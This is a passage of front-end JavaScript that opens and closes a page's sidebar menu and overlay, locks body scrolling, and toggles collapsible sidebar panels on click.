        document.body.style.overflow = 'hidden';
    }

    function closeSidebar() {
        if (sidebar) sidebar.classList.remove('open');
        if (overlay) overlay.classList.remove('open');
        document.body.style.overflow = '';
    }

    if (menuToggle) {
        menuToggle.addEventListener('click', openSidebar);
    }
    if (closeBtn) closeBtn.addEventListener('click', closeSidebar);
    if (overlay) overlay.addEventListener('click', closeSidebar);

    const sidebarItems = document.querySelectorAll('.sidebar-item');
    sidebarItems.forEach(function(item) {
        item.addEventListener('click', function() {
            const panel = item.nextElementSibling;
            if (panel && panel.classList.contains('sidebar-item-panel')) {
                panel.classList.toggle('open');
            }
        });
    });
});
